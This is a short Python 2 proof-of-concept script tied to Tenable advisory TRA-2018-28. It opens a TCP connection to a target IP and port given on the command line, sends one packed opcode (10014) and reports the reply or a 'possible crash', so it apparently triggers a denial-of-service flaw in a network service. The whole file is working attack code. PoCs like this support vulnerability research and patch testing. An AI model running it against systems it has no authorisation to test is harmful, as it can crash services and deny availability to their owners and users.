import struct
import binascii
import socket, sys
import time

# http://tenable.com/security/research/tra-2018-28

def print_usage():
    print "Usage: python " + sys.argv[0] + " <ip> <port>"
    sys.exit(0)

ip = sys.argv[1]
if len(sys.argv) == 3:
    try:
        port = int(sys.argv[2])
    except:
        print "Invalid port number."
        print_usage()
else:
    print_usage()

print "Target: " + ip + ":" + str(port)

opcode = 10014
print "\nSending opcode " + str(opcode)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

s = struct.Struct(">i")
packed_data = s.pack(opcode)

sock.send(packed_data)

try:
    resp = sock.recv(1024)
    print "Response: '" + resp + "'"
except:
    print "No response... possible crash!"
sock.close()
